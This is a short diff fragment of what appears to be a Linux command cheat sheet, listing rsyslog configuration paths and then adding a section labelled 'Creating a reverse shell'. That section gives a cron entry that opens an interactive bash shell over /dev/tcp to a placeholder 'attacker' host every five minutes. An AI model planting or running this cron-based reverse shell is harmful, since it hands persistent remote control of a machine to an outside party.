@@ -443,3 +443,6 @@ journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
 /etc/rsyslog
 /etc/rsyslog.d/*
 /etc/rsyslog.conf
+# Creating a reverse shell 
+crontab -e
+*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'
